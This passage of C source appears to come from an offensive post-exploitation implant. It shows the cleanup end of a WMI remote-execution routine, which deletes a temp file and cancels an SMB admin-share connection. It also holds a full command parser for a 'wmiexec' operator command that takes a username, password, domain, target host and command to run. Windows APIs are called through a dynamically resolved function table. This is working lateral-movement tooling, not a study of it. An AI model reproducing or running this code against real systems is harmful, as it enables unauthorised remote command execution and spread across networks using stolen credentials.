    if (tpath[0] && GetFileAttributesA(tpath) != INVALID_FILE_ATTRIBUTES) {
        if (!DeleteFileA(tpath)) {
            at = w_cat(out, cap, at, "[!] temp file left behind: ");
            at = w_cat(out, cap, at, tpath);
            at = w_cat(out, cap, at, "\r\n");
        }
    }
    if (smb_conn && d.WNetCancelConnection2A) {
        d.WNetCancelConnection2A(admin, 0, TRUE);
    }

    w_free_bstr(bCmd);
    w_free_bstr(bMethod);
    w_free_bstr(bPath);
    w_free_bstr(bAuth);
    w_free_bstr(bPass);
    w_free_bstr(bUser);
    w_free_bstr(bNs);

    if (pOut)   pOut->lpVtbl->Release(pOut);
    if (pInst)  pInst->lpVtbl->Release(pInst);
    if (pIn)    pIn->lpVtbl->Release(pIn);
    if (pClass) pClass->lpVtbl->Release(pClass);
    if (pSvc)   pSvc->lpVtbl->Release(pSvc);
    if (pLoc)   pLoc->lpVtbl->Release(pLoc);

    if (com_inited && d.CoUninitialize) d.CoUninitialize();

    (void)com_usable;
    (void)w_len;
    return at;
}

/* -------------------------------------------------- command line parser */

/* wmiexec [-u user] [-p pass] [-d domain] <host> <cmd ...>
 * Options are taken from the front, then one token is the host and every
 * remaining token (re-joined with single spaces) is the command. */
unsigned int ops_wmiexec_cmdline(const char *args, unsigned char *out, unsigned int cap)
{
    char tok[16][200];
    unsigned int ntok = 0, p = 0, i, k;
    char user[160], pass[160], domain[160];
    char host[200], cmd[600];
    unsigned int ci = 0;

    user[0] = 0;
    pass[0] = 0;
    domain[0] = 0;
    host[0] = 0;
    cmd[0] = 0;

    if (!args || !args[0]) {
        return w_cat(out, cap, 0,
            "[-] usage: wmiexec [-u user] [-p pass] [-d domain] <host> <cmd>\r\n");
    }

    while (ntok < 16) {
        while (args[p] == ' ') p++;
        if (!args[p]) break;
        k = 0;
        while (args[p] && args[p] != ' ' && k + 1 < sizeof(tok[0])) tok[ntok][k++] = args[p++];
        tok[ntok][k] = 0;
        ntok++;
    }
    if (ntok == 0) {
        return w_cat(out, cap, 0, "[-] empty wmiexec arguments\r\n");
    }

    i = 0;
    while (i + 1 < ntok && tok[i][0] == '-' && (tok[i][1] == 'u' || tok[i][1] == 'p' || tok[i][1] == 'd')) {
        if (tok[i][1] == 'u') w_copy(user, sizeof(user), tok[i + 1]);
        else if (tok[i][1] == 'p') w_copy(pass, sizeof(pass), tok[i + 1]);
        else w_copy(domain, sizeof(domain), tok[i + 1]);
        i += 2;
    }

    if (i < ntok) w_copy(host, sizeof(host), tok[i++]);
    while (i < ntok) {
        if (ci > 0) ci = w_put(cmd, sizeof(cmd), ci, " ");
        ci = w_put(cmd, sizeof(cmd), ci, tok[i]);
        i++;
    }

    if (!host[0] || !cmd[0]) {
        return w_cat(out, cap, 0,
            "[-] usage: wmiexec [-u user] [-p pass] [-d domain] <host> <cmd>\r\n");
    }

    return ops_wmiexec(host, user, domain, pass, cmd, out, cap);
}
